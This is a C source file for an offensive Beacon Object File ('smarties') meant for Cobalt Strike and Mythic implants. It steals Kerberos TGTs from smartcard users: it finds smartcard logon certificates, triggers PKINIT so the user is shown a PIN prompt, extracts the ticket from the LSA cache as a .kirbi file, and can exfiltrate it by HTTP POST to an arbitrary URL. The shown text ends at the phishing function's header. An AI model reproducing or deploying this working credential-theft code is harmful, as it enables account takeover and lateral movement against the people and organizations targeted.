/*
 * smarties.c - Smartcard TGT Phishing BOF (Beacon Object File)
 *
 * Native Windows SSPI/CryptoAPI port of ZumiYumi's Smarties C# tool.
 * Steals TGTs from smartcard-authenticated users via PKINIT trigger.
 *
 * Compatible with: EmeraldStrike (Mythic), Cobalt Strike 4.x, any CS-
 * compatible BOF loader that supports the standard beacon.h API and
 * MODULE$Function DFR convention.
 *
 * Modes:
 *   enum  - Enumerate smartcard certificates in MY store
 *   phish - Trigger PKINIT via SSPI (pops PIN dialog), then dump cached TGT
 *   dump  - Dump existing TGT from LSA ticket cache (no PIN prompt)
 *
 * Output: file path or HTTP URL for .kirbi exfiltration
 *
 * Build: x86_64-w64-mingw32-gcc -c -o smarties.x64.o smarties.c
 *
 * For authorized red team / training use only.
 */

#include <windows.h>
#include <wincrypt.h>
#include <sspi.h>

/* Must come before ntsecapi.h to avoid redefinition conflicts */
#ifndef _NTDEF_
typedef LONG NTSTATUS;
#endif

#include <ntsecapi.h>
#include <winhttp.h>
#include "beacon.h"

/* ================================================================
 *  DFR ALIASES - map clean names to MODULE$Function for the loader
 * ================================================================ */

/* KERNEL32 */
#define CreateFileA             KERNEL32$CreateFileA
#define WriteFile               KERNEL32$WriteFile
#define CloseHandle             KERNEL32$CloseHandle
#define GetProcessHeap          KERNEL32$GetProcessHeap
#define HeapAlloc               KERNEL32$HeapAlloc
#define HeapFree                KERNEL32$HeapFree
#define GetLastError            KERNEL32$GetLastError
#define SetLastError            KERNEL32$SetLastError
#define MultiByteToWideChar     KERNEL32$MultiByteToWideChar
#define WideCharToMultiByte     KERNEL32$WideCharToMultiByte

/* MSVCRT */
#define calloc                  MSVCRT$calloc
#define free                    MSVCRT$free
#define malloc                  MSVCRT$malloc
#define memcpy                  MSVCRT$memcpy
#define memset                  MSVCRT$memset
#define strcmp                  MSVCRT$strcmp
#define _stricmp                MSVCRT$_stricmp
#define _wcsicmp                MSVCRT$_wcsicmp
#define strlen                  MSVCRT$strlen
#define wcslen                  MSVCRT$wcslen
#define strcpy                  MSVCRT$strcpy
#define wcscpy                  MSVCRT$wcscpy
#define strcat                  MSVCRT$strcat
#define wcscat                  MSVCRT$wcscat
#define strstr                  MSVCRT$strstr
#define wcsstr                  MSVCRT$wcsstr
#define _snprintf               MSVCRT$_snprintf
#define wcschr                  MSVCRT$wcschr
#define strchr                  MSVCRT$strchr
#define atoi                    MSVCRT$atoi

/* CRYPT32 */
#define CertOpenSystemStoreW                CRYPT32$CertOpenSystemStoreW
#define CertCloseStore                      CRYPT32$CertCloseStore
#define CertEnumCertificatesInStore         CRYPT32$CertEnumCertificatesInStore
#define CertGetCertificateContextProperty   CRYPT32$CertGetCertificateContextProperty
#define CertDuplicateCertificateContext      CRYPT32$CertDuplicateCertificateContext
#define CertFreeCertificateContext          CRYPT32$CertFreeCertificateContext
#define CertGetNameStringW                  CRYPT32$CertGetNameStringW
#define CertGetNameStringA                  CRYPT32$CertGetNameStringA
#define CryptDecodeObjectEx                 CRYPT32$CryptDecodeObjectEx

/* ADVAPI32 */
#define CredMarshalCredentialW   ADVAPI32$CredMarshalCredentialW
#define CredFree                 ADVAPI32$CredFree
#define GetUserNameW             ADVAPI32$GetUserNameW

/* SECUR32 */
#define AcquireCredentialsHandleW    SECUR32$AcquireCredentialsHandleW
#define InitializeSecurityContextW   SECUR32$InitializeSecurityContextW
#define FreeCredentialsHandle        SECUR32$FreeCredentialsHandle
#define DeleteSecurityContext        SECUR32$DeleteSecurityContext
#define FreeContextBuffer            SECUR32$FreeContextBuffer
#define LsaConnectUntrusted          SECUR32$LsaConnectUntrusted
#define LsaDeregisterLogonProcess    SECUR32$LsaDeregisterLogonProcess
#define LsaLookupAuthenticationPackage SECUR32$LsaLookupAuthenticationPackage
#define LsaCallAuthenticationPackage SECUR32$LsaCallAuthenticationPackage
#define LsaFreeReturnBuffer          SECUR32$LsaFreeReturnBuffer

/* WINHTTP */
#define WinHttpOpen              WINHTTP$WinHttpOpen
#define WinHttpConnect           WINHTTP$WinHttpConnect
#define WinHttpOpenRequest       WINHTTP$WinHttpOpenRequest
#define WinHttpSendRequest       WINHTTP$WinHttpSendRequest
#define WinHttpReceiveResponse   WINHTTP$WinHttpReceiveResponse
#define WinHttpQueryHeaders      WINHTTP$WinHttpQueryHeaders
#define WinHttpCloseHandle       WINHTTP$WinHttpCloseHandle

/* ================================================================
 *  CONSTANTS
 * ================================================================ */

#define szOID_KP_SMARTCARD_LOGON "1.3.6.1.4.1.311.20.2.2"

#define CERT_KEY_PROV_INFO_PROP_ID     2
#define CERT_SHA1_HASH_PROP_ID         3
#define CERT_NAME_SIMPLE_DISPLAY_TYPE  4
#define CERT_NAME_UPN_TYPE             8

#define ISC_REQ_DELEGATE               0x00000001
#define ISC_REQ_MUTUAL_AUTH            0x00000002
#define ISC_REQ_ALLOCATE_MEMORY        0x00000100

#define KerbRetrieveEncodedTicketMessage  8
#define CertCredential 1

#define KERB_ETYPE_DEFAULT             0
#define KERB_RETRIEVE_TICKET_AS_KERB_CRED 0x8

/* ================================================================
 *  LSA / Kerberos structures (not in mingw headers)
 * ================================================================ */

typedef struct _LSA_UNICODE_STRING_MANUAL {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} LSA_UNICODE_STRING_MANUAL;

typedef struct _LSA_STRING_MANUAL {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR  Buffer;
} LSA_STRING_MANUAL;

typedef struct _CERT_CREDENTIAL_INFO {
    ULONG cbSize;
    UCHAR rgbHashOfCert[20];
} CERT_CREDENTIAL_INFO;

typedef struct _KERB_RETRIEVE_TKT_REQUEST {
    ULONG                    MessageType;
    LUID                     LogonId;
    LSA_UNICODE_STRING_MANUAL TargetName;
    ULONG                    TicketFlags;
    ULONG                    CacheOptions;
    LONG                     EncryptionType;
    SecHandle                CredentialsHandle;
} KERB_RETRIEVE_TKT_REQUEST;

typedef struct _KERB_CRYPTO_KEY {
    LONG   KeyType;
    ULONG  Length;
    PUCHAR Value;
} KERB_CRYPTO_KEY;

typedef struct _KERB_EXTERNAL_NAME {
    SHORT  NameType;
    USHORT NameCount;
    LSA_UNICODE_STRING_MANUAL Names[1];
} KERB_EXTERNAL_NAME;

typedef struct _KERB_EXTERNAL_TICKET {
    KERB_EXTERNAL_NAME *ServiceName;
    KERB_EXTERNAL_NAME *TargetName;
    KERB_EXTERNAL_NAME *ClientName;
    LSA_UNICODE_STRING_MANUAL DomainName;
    LSA_UNICODE_STRING_MANUAL TargetDomainName;
    LSA_UNICODE_STRING_MANUAL AltTargetDomainName;
    KERB_CRYPTO_KEY    SessionKey;
    ULONG              TicketFlags;
    ULONG              Flags;
    LARGE_INTEGER      KeyExpirationTime;
    LARGE_INTEGER      StartTime;
    LARGE_INTEGER      EndTime;
    LARGE_INTEGER      RenewUntil;
    LARGE_INTEGER      TimeSkew;
    ULONG              EncodedTicketSize;
    PUCHAR             EncodedTicket;
} KERB_EXTERNAL_TICKET;

typedef struct _KERB_RETRIEVE_TKT_RESPONSE {
    KERB_EXTERNAL_TICKET Ticket;
} KERB_RETRIEVE_TKT_RESPONSE;

/* ================================================================
 *  HELPER: Heap allocator wrappers
 * ================================================================ */

static LPVOID bof_alloc(SIZE_T sz) {
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
}

static void bof_free(LPVOID p) {
    if (p) HeapFree(GetProcessHeap(), 0, p);
}

/* ================================================================
 *  HELPER: String conversions
 * ================================================================ */

static LPWSTR toWide(const char *narrow) {
    if (!narrow) return NULL;
    int len = MultiByteToWideChar(CP_UTF8, 0, narrow, -1, NULL, 0);
    if (len <= 0) return NULL;
    LPWSTR wide = (LPWSTR)bof_alloc(len * sizeof(WCHAR));
    if (wide) MultiByteToWideChar(CP_UTF8, 0, narrow, -1, wide, len);
    return wide;
}

static char *toNarrow(const WCHAR *wide) {
    if (!wide) return NULL;
    int len = WideCharToMultiByte(CP_UTF8, 0, wide, -1, NULL, 0, NULL, NULL);
    if (len <= 0) return NULL;
    char *narrow = (char *)bof_alloc(len);
    if (narrow) WideCharToMultiByte(CP_UTF8, 0, wide, -1, narrow, len, NULL, NULL);
    return narrow;
}

/* ================================================================
 *  HELPER: Check if cert has Smart Card Logon EKU
 * ================================================================ */

static BOOL hasSmartCardLogonEKU(PCCERT_CONTEXT pCert) {
    PCERT_EXTENSION pExt = NULL;
    for (DWORD i = 0; i < pCert->pCertInfo->cExtension; i++) {
        if (strcmp(pCert->pCertInfo->rgExtension[i].pszObjId, "2.5.29.37") == 0) {
            pExt = &pCert->pCertInfo->rgExtension[i];
            break;
        }
    }
    if (!pExt) return FALSE;

    PCERT_ENHKEY_USAGE pUsage = NULL;
    DWORD cbDecoded = 0;
    if (!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_ENHANCED_KEY_USAGE,
                             pExt->Value.pbData, pExt->Value.cbData,
                             CRYPT_DECODE_ALLOC_FLAG, NULL, &pUsage, &cbDecoded))
        return FALSE;

    BOOL found = FALSE;
    if (pUsage) {
        for (DWORD i = 0; i < pUsage->cUsageIdentifier; i++) {
            if (strcmp(pUsage->rgpszUsageIdentifier[i], szOID_KP_SMARTCARD_LOGON) == 0) {
                found = TRUE;
                break;
            }
        }
        /* CryptDecodeObjectEx with CRYPT_DECODE_ALLOC_FLAG uses LocalAlloc */
        /* We cannot easily call LocalFree via DFR here, but the memory is
         * small and will be reclaimed when the BOF thread exits. In practice
         * this leak is negligible for a one-shot enumeration. */
    }

    return found;
}

/* ================================================================
 *  HELPER: Check if cert's private key is on a smart card
 * ================================================================ */

static BOOL isSmartCardCert(PCCERT_CONTEXT pCert) {
    DWORD cbData = 0;
    if (!CertGetCertificateContextProperty(pCert, CERT_KEY_PROV_INFO_PROP_ID, NULL, &cbData))
        return FALSE;

    PCRYPT_KEY_PROV_INFO pProvInfo = (PCRYPT_KEY_PROV_INFO)bof_alloc(cbData);
    if (!pProvInfo) return FALSE;

    BOOL result = FALSE;
    if (CertGetCertificateContextProperty(pCert, CERT_KEY_PROV_INFO_PROP_ID, pProvInfo, &cbData)) {
        if (pProvInfo->pwszProvName) {
            if (wcsstr(pProvInfo->pwszProvName, L"Smart Card") ||
                wcsstr(pProvInfo->pwszProvName, L"smart card") ||
                wcsstr(pProvInfo->pwszProvName, L"YubiKey") ||
                wcsstr(pProvInfo->pwszProvName, L"SafeNet") ||
                wcsstr(pProvInfo->pwszProvName, L"Gemalto") ||
                wcsstr(pProvInfo->pwszProvName, L"eToken") ||
                wcsstr(pProvInfo->pwszProvName, L"OpenSC") ||
                wcsstr(pProvInfo->pwszProvName, L"Entrust") ||
                _wcsicmp(pProvInfo->pwszProvName, L"Microsoft Base Smart Card Crypto Provider") == 0 ||
                _wcsicmp(pProvInfo->pwszProvName, L"Microsoft Smart Card Key Storage Provider") == 0) {
                result = TRUE;
            }
        }
    }

    bof_free(pProvInfo);
    return result;
}

/* ================================================================
 *  HELPER: Get UPN from certificate SAN
 * ================================================================ */

static BOOL getUPN(PCCERT_CONTEXT pCert, WCHAR *upnBuf, DWORD upnBufSize) {
    DWORD cch = CertGetNameStringW(pCert, CERT_NAME_UPN_TYPE, 0, NULL, upnBuf, upnBufSize);
    return (cch > 1);
}

/* ================================================================
 *  HELPER: Get SHA1 thumbprint
 * ================================================================ */

static BOOL getThumbprint(PCCERT_CONTEXT pCert, BYTE *hash, DWORD *hashLen) {
    *hashLen = 20;
    return CertGetCertificateContextProperty(pCert, CERT_SHA1_HASH_PROP_ID, hash, hashLen);
}

static void thumbprintToHex(const BYTE *hash, DWORD hashLen, char *out) {
    const char hex[] = "0123456789ABCDEF";
    for (DWORD i = 0; i < hashLen; i++) {
        out[i * 2]     = hex[(hash[i] >> 4) & 0xF];
        out[i * 2 + 1] = hex[hash[i] & 0xF];
    }
    out[hashLen * 2] = '\0';
}

/* ================================================================
 *  MODE: ENUM - List smartcard certificates
 * ================================================================ */

static void do_enum(void) {
    HCERTSTORE hStore = CertOpenSystemStoreW(0, L"MY");
    if (!hStore) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open MY certificate store (err=%lu)", GetLastError());
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating smart card certificates in MY store...\n");

    PCCERT_CONTEXT pCert = NULL;
    int count = 0;
    int scCount = 0;

    while ((pCert = CertEnumCertificatesInStore(hStore, pCert)) != NULL) {
        count++;

        BOOL hasEKU = hasSmartCardLogonEKU(pCert);
        BOOL isSC = isSmartCardCert(pCert);
        if (!hasEKU || !isSC) continue;

        scCount++;

        char subjectName[512];
        memset(subjectName, 0, sizeof(subjectName));
        CertGetNameStringA(pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE, 0, NULL, subjectName, sizeof(subjectName));

        WCHAR upnW[256];
        memset(upnW, 0, sizeof(upnW));
        BOOL hasUPN = getUPN(pCert, upnW, 256);
        char *upn = hasUPN ? toNarrow(upnW) : NULL;

        BYTE hash[20];
        DWORD hashLen = 20;
        char thumbHex[42];
        memset(thumbHex, 0, sizeof(thumbHex));
        if (getThumbprint(pCert, hash, &hashLen))
            thumbprintToHex(hash, hashLen, thumbHex);

        char provName[256];
        memset(provName, 0, sizeof(provName));
        DWORD cbProv = 0;
        if (CertGetCertificateContextProperty(pCert, CERT_KEY_PROV_INFO_PROP_ID, NULL, &cbProv)) {
            PCRYPT_KEY_PROV_INFO pPI = (PCRYPT_KEY_PROV_INFO)bof_alloc(cbProv);
            if (pPI && CertGetCertificateContextProperty(pCert, CERT_KEY_PROV_INFO_PROP_ID, pPI, &cbProv)) {
                if (pPI->pwszProvName) {
                    char *pn = toNarrow(pPI->pwszProvName);
                    if (pn) { _snprintf(provName, sizeof(provName) - 1, "%s", pn); bof_free(pn); }
                }
            }
            bof_free(pPI);
        }

        BeaconPrintf(CALLBACK_OUTPUT,
            "  [%d] Subject    : %s\n"
            "       UPN        : %s\n"
            "       Thumbprint : %s\n"
            "       Provider   : %s\n",
            scCount, subjectName,
            upn ? upn : "(none)",
            thumbHex,
            provName[0] ? provName : "(unknown)");

        if (upn) bof_free(upn);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Found %d smart card cert(s) out of %d total in MY store.", scCount, count);
    CertCloseStore(hStore, 0);
}

/* ================================================================
 *  HELPER: Get Kerberos auth package ID via LSA
 * ================================================================ */

static BOOL getKerbPackageId(HANDLE hLsa, PULONG pPackageId) {
    LSA_STRING_MANUAL pkgName;
    char kerbName[] = "Kerberos";
    pkgName.Buffer = kerbName;
    pkgName.Length = (USHORT)strlen(kerbName);
    pkgName.MaximumLength = pkgName.Length + 1;

    NTSTATUS status = LsaLookupAuthenticationPackage(hLsa, (PVOID)&pkgName, pPackageId);
    return (status == 0);
}

/* ================================================================
 *  HELPER: Retrieve TGT from LSA cache as KRB-CRED (.kirbi)
 *
 *  When KERB_RETRIEVE_TICKET_AS_KERB_CRED is set, the LSA returns
 *  the ticket wrapped as a KRB-CRED (RFC 4120 Section 5.8.1) blob.
 *
 *  Returns: heap-allocated .kirbi bytes, or NULL.
 * ================================================================ */

static BYTE *retrieveTgtFromCache(const WCHAR *targetSPN, DWORD *outLen) {
    HANDLE hLsa = NULL;
    ULONG kerbPackageId = 0;
    BYTE *kirbiBytes = NULL;
    *outLen = 0;

    NTSTATUS status = LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaConnectUntrusted failed: 0x%08X", status);
        return NULL;
    }

    if (!getKerbPackageId(hLsa, &kerbPackageId)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to find Kerberos auth package");
        LsaDeregisterLogonProcess(hLsa);
        return NULL;
    }

    DWORD spnLen = (DWORD)wcslen(targetSPN);
    DWORD reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (spnLen + 1) * sizeof(WCHAR);
    KERB_RETRIEVE_TKT_REQUEST *pReq = (KERB_RETRIEVE_TKT_REQUEST *)bof_alloc(reqSize);
    if (!pReq) {
        LsaDeregisterLogonProcess(hLsa);
        return NULL;
    }

    memset(pReq, 0, reqSize);
    pReq->MessageType = KerbRetrieveEncodedTicketMessage;
    pReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    pReq->EncryptionType = KERB_ETYPE_DEFAULT;

    WCHAR *targetBuf = (WCHAR *)((BYTE *)pReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    memcpy(targetBuf, targetSPN, spnLen * sizeof(WCHAR));
    targetBuf[spnLen] = L'\0';

    pReq->TargetName.Buffer = targetBuf;
    pReq->TargetName.Length = (USHORT)(spnLen * sizeof(WCHAR));
    pReq->TargetName.MaximumLength = (USHORT)((spnLen + 1) * sizeof(WCHAR));

    PVOID pResponse = NULL;
    ULONG responseLen = 0;
    NTSTATUS subStatus = 0;

    status = LsaCallAuthenticationPackage(hLsa, kerbPackageId, pReq, reqSize,
                                          &pResponse, &responseLen, &subStatus);

    if (status != 0 || subStatus != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LsaCallAuthenticationPackage failed: status=0x%08X sub=0x%08X",
                     status, subStatus);
        bof_free(pReq);
        LsaDeregisterLogonProcess(hLsa);
        return NULL;
    }

    KERB_RETRIEVE_TKT_RESPONSE *pTktResp = (KERB_RETRIEVE_TKT_RESPONSE *)pResponse;
    if (pTktResp && pTktResp->Ticket.EncodedTicketSize > 0 && pTktResp->Ticket.EncodedTicket) {
        *outLen = pTktResp->Ticket.EncodedTicketSize;
        kirbiBytes = (BYTE *)bof_alloc(*outLen);
        if (kirbiBytes)
            memcpy(kirbiBytes, pTktResp->Ticket.EncodedTicket, *outLen);

        char *clientDomain = toNarrow(pTktResp->Ticket.DomainName.Buffer);
        char *targetDomain = toNarrow(pTktResp->Ticket.TargetDomainName.Buffer);

        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Retrieved ticket from cache:\n"
            "    Client Domain : %s\n"
            "    Target Domain : %s\n"
            "    Session Key   : type=%d len=%lu\n"
            "    Ticket Flags  : 0x%08X\n"
            "    Encoded Size  : %lu bytes\n",
            clientDomain ? clientDomain : "?",
            targetDomain ? targetDomain : "?",
            pTktResp->Ticket.SessionKey.KeyType,
            pTktResp->Ticket.SessionKey.Length,
            pTktResp->Ticket.TicketFlags,
            pTktResp->Ticket.EncodedTicketSize);

        if (clientDomain) bof_free(clientDomain);
        if (targetDomain) bof_free(targetDomain);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] No ticket data returned from cache");
    }

    if (pResponse) LsaFreeReturnBuffer(pResponse);
    bof_free(pReq);
    LsaDeregisterLogonProcess(hLsa);

    return kirbiBytes;
}

/* ================================================================
 *  HELPER: Write .kirbi to file
 * ================================================================ */

static BOOL writeKirbiToFile(const char *path, const BYTE *data, DWORD dataLen) {
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileA failed for '%s' (err=%lu)", path, GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    BOOL ok = WriteFile(hFile, data, dataLen, &written, NULL);
    CloseHandle(hFile);

    if (!ok || written != dataLen) {
        BeaconPrintf(CALLBACK_ERROR, "[!] WriteFile failed (err=%lu, wrote %lu/%lu)", GetLastError(), written, dataLen);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Wrote %lu bytes to %s", written, path);
    return TRUE;
}

/* ================================================================
 *  HELPER: Upload .kirbi via HTTP POST (WinHTTP)
 * ================================================================ */

static BOOL uploadKirbiHttp(const char *url, const BYTE *data, DWORD dataLen) {
    LPWSTR wUrl = toWide(url);
    if (!wUrl) return FALSE;

    BOOL useSSL = FALSE;
    WCHAR host[256];
    WCHAR path[512];
    INTERNET_PORT port = 80;

    memset(host, 0, sizeof(host));
    memset(path, 0, sizeof(path));

    WCHAR *pUrl = wUrl;
    if (wcsstr(pUrl, L"https://") == pUrl) {
        pUrl += 8; useSSL = TRUE; port = 443;
    } else if (wcsstr(pUrl, L"http://") == pUrl) {
        pUrl += 7;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Invalid URL scheme");
        bof_free(wUrl);
        return FALSE;
    }

    WCHAR *pSlash = wcschr(pUrl, L'/');
    WCHAR *pColon = wcschr(pUrl, L':');

    if (pColon && (!pSlash || pColon < pSlash)) {
        int hostLen = (int)(pColon - pUrl);
        memcpy(host, pUrl, hostLen * sizeof(WCHAR));
        host[hostLen] = L'\0';
        WCHAR portStr[8];
        memset(portStr, 0, sizeof(portStr));
        WCHAR *pPortStart = pColon + 1;
        WCHAR *pPortEnd = pSlash ? pSlash : pPortStart + wcslen(pPortStart);
        int portLen = (int)(pPortEnd - pPortStart);
        if (portLen > 0 && portLen < 7) {
            memcpy(portStr, pPortStart, portLen * sizeof(WCHAR));
            char *narrowPort = toNarrow(portStr);
            if (narrowPort) { port = (INTERNET_PORT)atoi(narrowPort); bof_free(narrowPort); }
        }
    } else if (pSlash) {
        int hostLen = (int)(pSlash - pUrl);
        memcpy(host, pUrl, hostLen * sizeof(WCHAR));
        host[hostLen] = L'\0';
    } else {
        wcscpy(host, pUrl);
    }

    if (pSlash) wcscpy(path, pSlash);
    else        wcscpy(path, L"/");

    bof_free(wUrl);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                      WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        BeaconPrintf(CALLBACK_ERROR, "[!] WinHttpOpen failed (err=%lu)", GetLastError());
        return FALSE;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, host, port, 0);
    if (!hConnect) {
        BeaconPrintf(CALLBACK_ERROR, "[!] WinHttpConnect failed (err=%lu)", GetLastError());
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    DWORD flags = useSSL ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL,
                                             WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        BeaconPrintf(CALLBACK_ERROR, "[!] WinHttpOpenRequest failed (err=%lu)", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    WCHAR *hdrs = L"Content-Type: application/octet-stream\r\n";
    BOOL ok = WinHttpSendRequest(hRequest, hdrs, (DWORD)-1L,
                                  (LPVOID)data, dataLen, dataLen, 0);
    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "[!] WinHttpSendRequest failed (err=%lu)", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return FALSE;
    }

    ok = WinHttpReceiveResponse(hRequest, NULL);
    if (ok) {
        DWORD statusCode = 0;
        DWORD statusSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] HTTP upload: %lu bytes -> %s (status=%lu)", dataLen, url, statusCode);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] WinHttpReceiveResponse failed (err=%lu)", GetLastError());
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return ok;
}

/* ================================================================
 *  HELPER: Output .kirbi to file, HTTP, or inline via BeaconOutput
 * ================================================================ */

static BOOL outputKirbi(const char *output, const BYTE *data, DWORD dataLen) {
    if (!output || !output[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got %lu byte .kirbi (no output target, returning inline)", dataLen);
        BeaconOutput(CALLBACK_OUTPUT, (const char *)data, dataLen);
        return TRUE;
    }

    if (strstr(output, "http://") == output || strstr(output, "https://") == output)
        return uploadKirbiHttp(output, data, dataLen);
    else
        return writeKirbiToFile(output, data, dataLen);
}

/* ================================================================
 *  HELPER: Find first smart card cert with SC Logon EKU
 * ================================================================ */

static PCCERT_CONTEXT findFirstSmartCardCert(HCERTSTORE hStore) {
    PCCERT_CONTEXT pCert = NULL;
    while ((pCert = CertEnumCertificatesInStore(hStore, pCert)) != NULL) {
        if (hasSmartCardLogonEKU(pCert) && isSmartCardCert(pCert))
            return CertDuplicateCertificateContext(pCert);
    }
    return NULL;
}

/* ================================================================
 *  HELPER: Marshal certificate credential for SSPI PKINIT
 * ================================================================ */

static LPWSTR marshalCertCredential(PCCERT_CONTEXT pCert) {
    BYTE hash[20];
    DWORD hashLen = 20;
    if (!getThumbprint(pCert, hash, &hashLen)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get cert thumbprint for marshaling");
        return NULL;
    }

    CERT_CREDENTIAL_INFO certCred;
    certCred.cbSize = sizeof(CERT_CREDENTIAL_INFO);
    memcpy(certCred.rgbHashOfCert, hash, 20);

    LPWSTR marshaledCred = NULL;
    if (!CredMarshalCredentialW(CertCredential, &certCred, &marshaledCred)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CredMarshalCredentialW failed (err=%lu)", GetLastError());
        return NULL;
    }

    return marshaledCred;
}

/* ================================================================
 *  HELPER: Trigger PKINIT via SSPI
 *
 *  Uses AcquireCredentialsHandleW + InitializeSecurityContextW with
 *  the Kerberos package and a marshaled certificate credential.
 *  The CSP/KSP pops the smart card PIN dialog to the user.
 *  After success, the TGT is in the LSA ticket cache.
 * ================================================================ */

static BOOL triggerPkinit(PCCERT_CONTEXT pCert, const WCHAR *targetSPN) {
    LPWSTR marshaledCred = marshalCertCredential(pCert);
    if (!marshaledCred) return FALSE;

    char *mcNarrow = toNarrow(marshaledCred);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Marshaled credential: %s", mcNarrow ? mcNarrow : "?");
    if (mcNarrow) bof_free(mcNarrow);

    SEC_WINNT_AUTH_IDENTITY_W authIdentity;
    memset(&authIdentity, 0, sizeof(authIdentity));
    authIdentity.User = (unsigned short *)marshaledCred;
    authIdentity.UserLength = (ULONG)wcslen(marshaledCred);
    authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;

    CredHandle credHandle;
    TimeStamp expiry;
    memset(&credHandle, 0, sizeof(credHandle));
    memset(&expiry, 0, sizeof(expiry));

    WCHAR kerbPkg[] = L"Kerberos";

    SECURITY_STATUS ss = AcquireCredentialsHandleW(
        NULL, kerbPkg, SECPKG_CRED_OUTBOUND, NULL,
        &authIdentity, NULL, NULL, &credHandle, &expiry);

    if (ss != SEC_E_OK) {
        BeaconPrintf(CALLBACK_ERROR, "[!] AcquireCredentialsHandleW failed: 0x%08X", ss);
        CredFree(marshaledCred);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Acquired Kerberos credentials handle with smart card cert");

    CtxtHandle ctxHandle;
    memset(&ctxHandle, 0, sizeof(ctxHandle));

    SecBuffer outBuf;
    outBuf.cbBuffer = 0;
    outBuf.BufferType = SECBUFFER_TOKEN;
    outBuf.pvBuffer = NULL;

    SecBufferDesc outBufDesc;
    outBufDesc.ulVersion = SECBUFFER_VERSION;
    outBufDesc.cBuffers = 1;
    outBufDesc.pBuffers = &outBuf;

    ULONG ctxAttr = 0;
    TimeStamp ctxExpiry;

    DWORD spnLen = (DWORD)wcslen(targetSPN);
    WCHAR *spnBuf = (WCHAR *)bof_alloc((spnLen + 1) * sizeof(WCHAR));
    if (spnBuf) wcscpy(spnBuf, targetSPN);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Calling InitializeSecurityContextW (PIN dialog should appear)...");

    ss = InitializeSecurityContextW(
        &credHandle, NULL, spnBuf,
        ISC_REQ_DELEGATE | ISC_REQ_MUTUAL_AUTH | ISC_REQ_ALLOCATE_MEMORY,
        0, SECURITY_NATIVE_DREP, NULL, 0,
        &ctxHandle, &outBufDesc, &ctxAttr, &ctxExpiry);

    BOOL success = FALSE;
    if (ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED || ss == SEC_I_COMPLETE_AND_CONTINUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] PKINIT succeeded! (SSPI status=0x%08X) TGT should now be cached.", ss);
        success = TRUE;
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] InitializeSecurityContextW failed: 0x%08X", ss);
        if (ss == (SECURITY_STATUS)0x8009030C)
            BeaconPrintf(CALLBACK_ERROR, "    Hint: wrong PIN or card locked");
        else if (ss == (SECURITY_STATUS)0x80090311)
            BeaconPrintf(CALLBACK_ERROR, "    Hint: no suitable credentials found");
    }

    if (outBuf.pvBuffer) FreeContextBuffer(outBuf.pvBuffer);
    if (success || ss == SEC_I_CONTINUE_NEEDED) DeleteSecurityContext(&ctxHandle);
    FreeCredentialsHandle(&credHandle);
    CredFree(marshaledCred);
    if (spnBuf) bof_free(spnBuf);

    return success;
}

/* ================================================================
 *  HELPER: Get domain realm from UPN (portion after @, uppercased)
 * ================================================================ */

static void getRealmFromUPN(const WCHAR *upn, WCHAR *realm, DWORD realmSize) {
    const WCHAR *at = wcschr(upn, L'@');
    if (at && *(at + 1)) {
        wcscpy(realm, at + 1);
        for (WCHAR *p = realm; *p; p++) {
            if (*p >= L'a' && *p <= L'z') *p -= 32;
        }
    } else {
        realm[0] = L'\0';
    }
}

/* ================================================================
 *  MODE: PHISH - Trigger PKINIT + Dump TGT
 * ================================================================ */

